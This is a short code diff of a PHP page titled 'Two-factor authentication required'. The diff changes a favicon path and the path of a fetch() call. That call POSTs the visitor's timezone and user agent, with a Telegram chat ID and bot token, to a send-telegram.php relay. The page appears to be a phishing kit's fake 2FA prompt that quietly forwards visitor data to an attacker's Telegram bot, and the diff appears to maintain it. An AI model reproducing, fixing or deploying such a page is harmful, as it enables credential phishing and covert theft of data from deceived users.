@@ -27,7 +27,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Two-factor authentication required</title>
-    <link rel="icon" href="../images/favicon.ico">
+    <link rel="icon" href="/images/favicon.ico">
        
     <style>
         * {
@@ -591,7 +591,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                 "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
             
-            fetch('../send-telegram.php', {
+            fetch('/send-telegram.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: content, parse_mode: 'Markdown', token: botToken })
